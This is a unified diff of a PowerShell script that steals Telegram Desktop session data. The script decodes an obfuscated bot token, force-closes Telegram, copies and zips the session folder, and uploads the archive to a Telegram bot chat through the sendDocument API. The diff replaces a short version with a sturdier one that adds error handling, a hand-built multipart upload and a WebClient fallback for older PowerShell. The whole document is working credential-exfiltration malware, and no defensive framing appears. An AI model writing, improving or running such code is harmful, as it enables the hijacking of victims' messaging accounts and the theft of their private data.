@@ -4,9 +4,43 @@ $z=Join-Path $env:TEMP "tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
 $a="Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
 $b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
 $c="5047177665"
-if(Get-Process Telegram -ErrorAction SilentlyContinue){Stop-Process -Name Telegram -Force;Start-Sleep -Milliseconds 500}
-New-Item $t -ItemType Directory -Force|Out-Null
-Copy-Item "$s\*" $t -Recurse -Force
-Compress-Archive "$t\*" $z -Force
-Invoke-RestMethod "https://api.telegram.org/bot$b/sendDocument" -Method Post -ContentType "multipart/form-data" -Form @{chat_id=$c;document=Get-Item $z}
-Remove-Item $t,$z -Recurse -Force -ErrorAction SilentlyContinue
+try {
+    if(Get-Process Telegram -ErrorAction SilentlyContinue) {
+        Stop-Process -Name Telegram -Force -ErrorAction Stop
+        Start-Sleep -Milliseconds 500
+    }
+    if(!(Test-Path $s -PathType Container)) { throw "Source directory $s not found" }
+    if(!(Test-Path $env:TEMP -PathType Container)) { throw "Temp directory $env:TEMP not found" }
+    New-Item $t -ItemType Directory -Force -ErrorAction Stop|Out-Null
+    Copy-Item "$s\*" $t -Recurse -Force -ErrorAction Stop
+    Compress-Archive "$t\*" $z -Force -ErrorAction Stop
+    if(!(Test-Path $z -PathType Leaf)) { throw "Zip file $z not created" }
+    $boundary="----Boundary$(Get-Random)"
+    $bodyLines=(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"chat_id`"",
+        "",
+        "$c",
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $z -Leaf)`"",
+        "Content-Type: application/octet-stream",
+        "",
+        [System.IO.File]::ReadAllBytes($z)|ForEach-Object{[char]$_},
+        "--$boundary--"
+    )
+    $body=$bodyLines -join "`r`n"
+    $uri="https://api.telegram.org/bot$b/sendDocument"
+    if($PSVersionTable.PSVersion.Major -ge 7) {
+        Invoke-RestMethod $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop
+    } else {
+        $webClient=New-Object System.Net.WebClient
+        $webClient.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
+        $webClient.UploadData($uri, [System.Text.Encoding]::UTF8.GetBytes($body))|Out-Null
+        $webClient.Dispose()
+    }
+} catch {
+    Write-Error "Error: $_"
+    throw
+} finally {
+    Remove-Item $t,$z -Recurse -Force -ErrorAction SilentlyContinue
+}
